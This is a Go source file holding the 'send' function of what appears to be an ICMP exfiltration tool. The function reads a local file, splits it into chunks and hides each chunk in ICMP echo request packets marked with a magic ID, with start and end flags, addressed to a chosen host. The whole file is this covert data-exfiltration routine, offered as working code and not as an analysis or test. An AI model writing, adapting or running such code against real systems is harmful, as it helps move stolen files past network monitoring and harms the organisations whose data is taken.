package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func send(file *string, debug *bool, host *string) {
	// Open the local file
	f, err := os.Open(*file)
	if err != nil {
		log.Fatalln(err)
		return
	}
	defer f.Close()

	// make file buffer
	buf := make([]byte, BUFFERSIZE)

	// Initialize data packet
	exfilPak := exfil{true, false, filepath.Base(*file), buf}
	echoPak := icmp.Echo{ID: MAGIC, Seq: 0, Data: nil}
	fullPak := icmp.Message{Type: ipv4.ICMPType(IPV4ICMPREQUEST), Code: 1, Checksum: 0, Body: &echoPak}

	// open up the "socket"
	addr, resErr := net.ResolveIPAddr("ip4:icmp", *host)
	if nil != resErr {
		log.Fatalln(resErr)
	}
	socket, sockErr := icmp.ListenPacket("ip4:icmp", addr.String())
	if sockErr != nil {
		log.Fatalln(sockErr)
		return
	}
	var b, pak = []byte(nil), []byte(nil)

	// if the file is big enough, keep sending data
	for {
		bytesRead, fileError := f.Read(buf)
		if fileError == io.EOF {
			break
		}
		exfilPak.data = buf[0:bytesRead]
		if *debug {
			fmt.Printf("buffer contents:\n%s\n", buf)
		}
		if bytesRead < BUFFERSIZE {
			break
		}
		pak := buildExfilPacket(exfilPak)
		echoPak.Data = pak
		fullPak.Body = icmp.MessageBody(&echoPak)
		b, marshErr := fullPak.Marshal(nil)
		if marshErr != nil {
			log.Fatalln(marshErr)
			return
		}
		socket.WriteTo(b, socket.LocalAddr())
		echoPak.Seq += 1
		exfilPak.first = false
	}

	// last iteration
	exfilPak.last = true
	pak = buildExfilPacket(exfilPak)
	echoPak.Data = pak
	fullPak.Body = icmp.MessageBody(&echoPak)
	b, _ = fullPak.Marshal(nil)
	socket.WriteTo(b, socket.LocalAddr())
	return
}
